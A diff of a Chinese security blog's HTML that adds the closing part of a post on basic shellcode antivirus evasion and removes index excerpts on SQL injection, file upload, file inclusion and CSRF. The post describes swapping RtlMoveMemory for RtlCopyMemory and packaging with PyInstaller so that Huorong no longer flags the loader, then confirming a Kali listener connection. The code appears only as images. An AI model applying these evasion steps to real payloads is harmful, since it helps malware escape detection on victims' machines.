+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214731699.png" alt="image-20220321214731699"></p>
+<p>还是没有报毒。</p>
+<p>就这样我们一行一行的来，在这样测试的情况下，我们发现火绒报毒了。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214829765.png" alt="image-20220321214829765"></p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220321214836264.png" alt="image-20220321214836264"></p>
+<p>也就是说，火绒识别了这一个危险的api函数:<code>RTLMoveMemory</code></p>
+<p>那么我们的方法是什么呢？替换相关函数。我们可以把我们的<code>RTLMoveMemory</code>函数更换为函数<code>RtlcopyMemory</code>函数</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220322205756511.png" alt="image-20220322205756511"></p>
+<p>火绒扫描并不报毒</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220322205816613.png" alt="image-20220322205816613"></p>
+<p>开着kali监听一下也运行成功</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220322205942280.png" alt="image-20220322205942280"></p>
+<p>但是在直接运行.py脚本的时候，发现火绒会以web扫描的理由报毒，但是仍然会连接上可以使用。于是尝试过使用pyinstaller打包以exe形式运行，火绒并不会报毒。</p>
 
-<p>order by 用于对结果集按照一个列或者多个列进行排序(默认是升序)</p>
-        
-          <a class="article-more-a" href="/2021/07/11/SQL%E6%B3%A8%E5%85%A5/#more">more >></a>
-        
       
 
       
@@ -364,30 +255,78 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
+      
 
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/11/SQL%E6%B3%A8%E5%85%A5/">展开全文 >></a>
-        </p>
-      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
 
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/03/21/shellcode%E7%9A%84%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2022/03/17/shellcode%E5%9F%BA%E7%A1%80%E4%B8%8E%E7%AE%80%E5%8D%95%E8%B0%83%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -407,245 +346,14 @@
 
 
 
-
-  
-    <article id="post-文件上传漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传与解析漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-07-11T07:39:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>很多web站点都有文件上传的接口(比如注册时上传头像等)由于没有对上传的文件类型进行严格限制，导致攻击者可以上传一些恶意文件（比如Webshell）。</p>
-<p>文件上传的本质是为了让上传的文件可以任意代码执行，达到对目标的控制。（Getshell）</p>
-        
-          <a class="article-more-a" href="/2021/07/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-文件包含漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">文件包含漏洞</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-07-11T02:38:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>程序开发人员通常会把可重复使用的函数写入到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程称为包含。相同代码重复出现在不同文件中出现代码冗余，所以出现了文件包含函数，就是让代码更为高效，需要用到的部分会去调用，且被包含的文件会被当作php代码执行（文件里面的东西是必须当作代码执行，文件包含，只要包含了，不管任何后缀，都会当作php代码执行）。</p>
-<p>有时候用于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就会导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
-        
-          <a class="article-more-a" href="/2021/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-CSRF跨站点请求伪造" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/11/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">CSRF跨站点请求伪造</a>
-    </h1>
-  
-
-        
-        <a href="/2021/07/11/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="archive-article-date">
-  	<time datetime="2021-07-11T02:07:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="什么是CSRF"><a href="#什么是CSRF" class="headerlink" title="什么是CSRF"></a>什么是CSRF</h1><p>CSRF跨站请求伪造，也被称为“One Click Attack”，通常缩写为CSRF，是一种对网站的恶意利用。它与XSS不同，XSS利用站点内的新人用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。</p>
-<p>它的成因是因为网站的Cookie在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，就会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的CSRF脚本或者包含CSRF脚本的链接，可能会执行一些用户不想做的功能。</p>
-<p>攻击特点：攻击者盗用用户的身份，以用户的名义进行某些非法操作。</p>
-<p>tips:业内对需要交互的漏洞不重视。</p>
-        
-          <a class="article-more-a" href="/2021/07/11/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂恋</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/07/11/CSRF%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
   
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/3/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
-    </nav>
+  
+
+  
+
+  
+
   
 
 
@@ -668,8 +376,8 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: true,
-		isPost: false,
+		isHome: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
